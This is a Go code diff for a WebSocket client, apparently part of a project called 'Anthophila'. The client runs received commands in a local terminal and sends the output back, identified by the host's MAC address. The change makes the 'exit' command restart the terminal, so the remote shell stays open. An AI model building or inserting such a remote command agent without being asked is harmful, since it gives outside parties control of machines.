@@ -4,7 +4,6 @@ import (
 	"Anthophila/information"
 	"Anthophila/terminal"
 	"encoding/json"
-	"fmt"
 	"github.com/gorilla/websocket"
 	"log"
 	"strings"
@@ -28,40 +27,28 @@ func (r *Reader) ReadMessage(ws *websocket.Conn) {
 	}
 }
 
+type Command struct {
+	SClient string `json:"sClient"`
+	Command string `json:"command"`
+}
+
+var cmd Command
+
+type myMessage struct {
+	SClient string `json:"sClient"`
+	RClient string `json:"rClient"`
+	Message string `json:"message"`
+}
+
 // Обробка отриманих команд через WebSocket
 func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {
-	type Command struct {
-		SClient string `json:"sClient"`
-		Command string `json:"command"`
-	}
-	var cmd Command
-	type myMessage struct {
-		SClient string `json:"sClient"`
-		RClient string `json:"rClient"`
-		Message string `json:"message"`
-	}
 
-	terminal := terminal.NewTerminalManager()
-	terminal.Start()
-	// Запускаємо горутину для обробки виходу терміналу
-	go func() {
-		for line := range terminal.GetOutput() {
-			msg := myMessage{
-				SClient: information.NewInfo().GetMACAddress(),
-				RClient: cmd.SClient,
-				Message: "{terminal:{" + strings.Trim(line, "\n") + "}}",
-			}
-			jsonData, err := json.Marshal(msg)
-			if err != nil {
-				log.Println("Error marshalling JSON:", err)
-				continue
-			}
-			log.Println("Json " + string(jsonData))
-			if err := NewSender().sendMessageWith(wSocket, jsonData); err != nil {
-				log.Println("Error sending message:", err)
-			}
-		}
-	}()
+	term := terminal.NewTerminalManager()
+	if err := term.Start(); err != nil {
+		log.Fatalf("Failed to start terminal: %v", err)
+	} else {
+		Terminal(wSocket, term)
+	}
 
 	for {
 		_, message, err := wSocket.ReadMessage()
@@ -96,12 +83,42 @@ func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {
 			} else {
 				// Основний цикл для взаємодії з користувачем
 				if strings.TrimSpace(cmd.Command) == "exit" {
-					terminal.Stop()
-					fmt.Println("Exiting...")
-					return
+					//fmt.Println("Exiting...")
+					term.Stop()
+					terminal := terminal.NewTerminalManager()
+					if err := terminal.Start(); err != nil {
+						log.Fatalf("Failed to start terminal: %v", err)
+					} else {
+						term = terminal
+						Terminal(wSocket, term)
+					}
+
+					continue
 				}
-				terminal.SendCommand(cmd.Command)
+				term.SendCommand(cmd.Command)
+
 			}
 		}
 	}
+}
+func Terminal(wSocket *websocket.Conn, term *terminal.TerminalManager) {
+	// Запускаємо горутину для обробки виходу терміналу
+	go func() {
+		for line := range term.GetOutput() {
+			msg := myMessage{
+				SClient: information.NewInfo().GetMACAddress(),
+				RClient: cmd.SClient,
+				Message: "{terminal:{" + strings.Trim(line, "\n") + "}}",
+			}
+			jsonData, err := json.Marshal(msg)
+			if err != nil {
+				log.Println("Error marshalling JSON:", err)
+				continue
+			}
+			log.Println("Json " + string(jsonData))
+			if err := NewSender().sendMessageWith(wSocket, jsonData); err != nil {
+				log.Println("Error sending message:", err)
+			}
+		}
+	}()
 }
